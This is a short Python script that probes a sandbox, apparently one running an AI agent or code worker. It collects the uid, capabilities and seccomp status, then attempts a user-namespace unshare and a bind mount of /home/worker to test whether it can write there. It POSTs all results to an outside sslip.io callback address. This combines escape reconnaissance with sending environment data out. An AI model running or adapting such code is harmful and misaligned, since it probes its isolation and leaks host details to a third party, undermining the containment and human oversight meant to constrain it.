import json,os,subprocess,time,urllib.request
out={'utc':time.strftime('%Y-%m-%dT%H:%M:%SZ',time.gmtime()),'uid':os.getuid(),'tests':{}}
def run(n,s):
 try:
  p=subprocess.run(['sh','-c',s],capture_output=True,text=True,timeout=20)
  out['tests'][n]={'rc':p.returncode,'stdout':p.stdout[-10000:],'stderr':p.stderr[-10000:]}
 except Exception as e: out['tests'][n]={'error':repr(e)}
run('identity',r'''id; grep -E '^(Uid|Gid|Cap|NoNewPrivs|Seccomp):' /proc/self/status; stat -c '%A %u:%g %n' /home/worker /tmp/workspace /tmp''')
run('bind_tmpfs',r'''rm -rf /tmp/nsb; mkdir -p /tmp/nsb; echo host=$(stat -c '%d:%i %A %u:%g %n' /home/worker); unshare -Ur -m --propagation private sh -c 'echo inside=$(id); cat /proc/self/uid_map; mkdir -p /tmp/nsb; mount --bind /home/worker /tmp/nsb; echo bind_rc=$?; findmnt -T /tmp/nsb -o TARGET,SOURCE,FSTYPE,OPTIONS 2>&1; ls -ld /tmp/nsb; stat -c "%d:%i %A %u:%g %n" /tmp/nsb; touch /tmp/nsb/probe 2>&1; echo touch_rc=$?; ls -la /tmp/nsb | head' 2>&1''')
raw=json.dumps(out,sort_keys=True,separators=(',',':')).encode()
try:
 req=urllib.request.Request('https://54.209.51.244.sslip.io/callback/snapgpt-userns-smoke-20261106',data=raw,method='POST',headers={'Content-Type':'application/json'})
 with urllib.request.urlopen(req,timeout=30) as r: out['sink']={'status':r.status,'body':r.read(1000).decode('utf-8','replace')}
except Exception as e: out['sink']={'error':repr(e)}
print(json.dumps(out,sort_keys=True,separators=(',',':')))
